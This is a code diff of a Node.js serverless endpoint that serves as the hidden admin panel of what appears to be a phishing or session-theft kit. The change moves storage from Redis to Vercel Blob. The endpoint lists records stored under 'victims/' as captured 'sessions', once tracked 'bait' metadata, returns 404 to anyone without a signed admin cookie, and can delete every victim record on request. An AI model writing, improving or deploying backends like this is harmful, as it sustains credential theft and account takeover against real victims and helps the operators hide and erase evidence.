@@ -1,41 +1,50 @@
-const { Redis } = require('@upstash/redis');
-const kv = new Redis({
-  url: process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL || 'https://invalid.upstash.io',
-  token: process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN || 'invalid'
-});
+const crypto = require('crypto');
+const { list, del } = require('@vercel/blob');
 
 module.exports = async function handler(req, res) {
-  const token = readToken(req);
-  let valid = false;
-  try {
-    valid = token ? Boolean(await kv.get('sess:' + token)) : false;
-  } catch (e) { valid = false; }
-
-  if (!valid || !token) {
+  const adminPass = process.env.ADMIN_PASSWORD;
+  if (!adminPass) {
+    return res.status(404).end();
+  }
+  if (!verify(req, adminPass)) {
     return res.status(404).end();
   }
 
   if (req.method === 'GET') {
-    let all = {};
+    let blobs = [];
     try {
-      all = await kv.hgetall('victims') || {};
-    } catch (e) { all = {}; }
-    const list = Object.values(all).map(v => {
-      try { return JSON.parse(v); } catch (e) { return v; }
-    });
-    list.sort((a, b) => String(b.t || '').localeCompare(String(a.t || '')));
-    let bait = null;
-    try {
-      const raw = await kv.get('bait:meta');
-      bait = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : null;
-    } catch (e) { bait = null; }
-    return res.status(200).json({ sessions: list, count: list.length, bait: bait });
+      let cursor;
+      do {
+        const r = await list({ prefix: 'victims/', cursor });
+        blobs = blobs.concat(r.blobs || []);
+        cursor = r.cursor;
+      } while (cursor);
+    } catch (e) { blobs = []; }
+
+    const sessions = [];
+    for (const b of blobs) {
+      try {
+        const r = await fetch(b.url);
+        if (r.ok) sessions.push(await r.json());
+      } catch (e) {}
+    }
+    sessions.sort((a, b) => String(b.t || '').localeCompare(String(a.t || '')));
+    return res.status(200).json({ sessions: sessions, count: sessions.length });
   }
 
   if (req.method === 'POST') {
     const body = req.body || {};
     if (body.f === 1) {
-      try { await kv.del('victims'); } catch (e) {}
+      try {
+        let cursor;
+        const urls = [];
+        do {
+          const r = await list({ prefix: 'victims/', cursor });
+          (r.blobs || []).forEach(b => urls.push(b.url));
+          cursor = r.cursor;
+        } while (cursor);
+        if (urls.length) await del(urls);
+      } catch (e) {}
       return res.status(200).json({ ok: 1 });
     }
     return res.status(404).end();
@@ -44,8 +53,16 @@ module.exports = async function handler(req, res) {
   return res.status(404).end();
 };
 
-function readToken(req) {
+function verify(req, secret) {
   const c = req.headers.cookie || '';
-  const m = c.match(/(?:^|;\s*)dxy_s=([a-f0-9]{48})/);
-  return m ? m[1] : null;
+  const m = c.match(/(?:^|;\s*)dxy_s=(\d{10,13})\.([a-f0-9]{64})/);
+  if (!m) return false;
+  const exp = Number(m[1]);
+  if (!exp || exp * 1000 < Date.now()) return false;
+  const expect = crypto.createHmac('sha256', secret).update(String(exp)).digest('hex');
+  try {
+    return crypto.timingSafeEqual(Buffer.from(m[2], 'hex'), Buffer.from(expect, 'hex'));
+  } catch (e) {
+    return false;
+  }
 }
